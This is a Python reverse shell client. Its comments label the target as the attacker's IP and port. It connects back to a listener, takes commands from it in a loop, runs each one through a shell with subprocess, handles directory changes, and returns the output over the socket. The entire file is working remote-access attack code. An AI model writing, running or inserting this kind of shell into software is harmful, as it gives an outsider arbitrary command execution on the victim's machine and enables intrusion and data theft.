#!/usr/bin/env python3
import socket
import subprocess
import os

# Server configuration (Attacker's IP and Port)
# Note: SERVER_IP must be set to the listener's IP address
SERVER_IP = '127.0.0.1' 
SERVER_PORT = 8080

print(f"[*] Connecting back to {SERVER_IP}:{SERVER_PORT}...")

try:
    # Create the client socket and connect to the server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVER_IP, SERVER_PORT))
    print("[+] Connection successful!")
    
    # Identify the initial working directory
    current_dir = os.getcwd()
    
    while True:
        # Wait for a command from the listener (max 1024 bytes)
        command = s.recv(1024).decode()
        
        # Exit if the server sends 'exit' or closes the connection
        if not command or command.lower().strip() in ['exit', 'quit']:
            break
        
        if command:
            command = command.strip()
            
            # SPECIAL CASE: 'cd' command
            # Changing directory must be handled by the os module,
            # not by subprocess, to affect the current script environment.
            if command.startswith('cd '):
                new_dir = command[3:].strip()
                try:
                    if new_dir:
                        os.chdir(new_dir)
                        current_dir = os.getcwd() # Get updated path
                        output = f'Now in: {current_dir}\n'
                    else:
                        output = f'Current: {current_dir}\n'
                except Exception as e:
                    output = f'Error: {e}\n'
            else:
                # EXECUTION OF GENERAL COMMANDS
                # shell=True: allows executing commands like 'ls', 'dir', 'whoami'
                # capture_output=True: grabs stdout and stderr
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    cwd=current_dir  # Execute the command in the current path
                )
                
                # Combine standard output and error messages
                output = result.stdout + result.stderr
                if not output:
                    output = 'Command executed (no output)\n'
            
            # Send the result back to the listener
            s.send(output.encode())
    
    s.close()
    
except Exception as e:
    print(f"[-] Critical Error: {e}")
